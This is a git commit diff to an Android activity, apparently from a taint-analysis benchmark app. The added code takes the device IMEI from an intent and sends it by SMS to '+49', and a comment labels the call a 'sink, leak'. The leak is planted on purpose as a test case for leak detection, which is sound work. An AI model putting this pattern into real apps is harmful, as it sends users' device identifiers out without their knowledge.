2829c3d012a325207550b2097a9e00ec24d29391
HaoFu <jamesfuhao@gamil.com>
2015-11-06 11:47:12 -0800

    create another activity

--- app/src/main/java/de/ecspride/Activity2.java
+++ app/src/main/java/de/ecspride/Activity2.java
@@ -1,36 +1,41 @@
 package de.ecspride;
 
 import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.view.View;
 import android.widget.Button;
+import android.widget.Toast;
 
 
 public class Activity2 extends Activity {
 
+    private String imei = null;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // Get the message from the intent
+        Intent intent = getIntent();
+        imei = intent.getStringExtra("dev id: ");
+
         setContentView(R.layout.activity_activity2);
-
-        Button button3 = (Button) findViewById(R.id.button3);
-        ClickListener cl = new ClickListener();
-        button3.setOnClickListener(cl);
     }
 
-    @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        // Handle action bar item clicks here. The action bar will
-        // automatically handle clicks on the Home/Up button, so long
-        // as you specify a parent activity in AndroidManifest.xml.
-        int id = item.getItemId();
-
-        //noinspection SimplifiableIfStatement
-        if (id == R.id.action_settings) {
-            return true;
-        }
-
-        return super.onOptionsItemSelected(item);
+    private void sendMessage(){
+        Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
     }
+
+    public void sendMessageWrapper(View view) {
+        sendMessage();
+    }
+
 }
